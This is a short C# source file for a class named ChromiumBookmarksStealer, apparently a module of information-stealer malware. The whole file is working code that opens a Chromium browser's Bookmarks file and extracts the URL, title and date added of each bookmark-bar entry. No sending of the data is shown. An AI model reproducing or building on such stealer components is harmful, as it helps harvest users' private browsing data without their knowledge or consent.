using System.Collections.Generic;
using System;

public class ChromiumBookmarksStealer
{
    public static List<BookmarkModel> GetBookmarks(string path)
    {
        if (!System.IO.File.Exists(path))
        {
            return new List<BookmarkModel>();
        }

        List<BookmarkModel> bookmarks = new List<BookmarkModel>();

        foreach (SimpleJSON.JSONNode mark in SimpleJSON.JSON.Parse(FileUtils.ReadFile(path))["roots"]["bookmark_bar"]["children"])
        {
            bookmarks.Add(new BookmarkModel()
            {
                URL = mark["url"],
                Title = mark["name"],
                DateAddedUTC = Convert.ToString(TimeZoneInfo.ConvertTimeFromUtc(DateTime.FromFileTimeUtc(10 * Convert.ToInt64((string)mark["date_added"])), TimeZoneInfo.Local))
            });
        }

        return bookmarks;
    }
}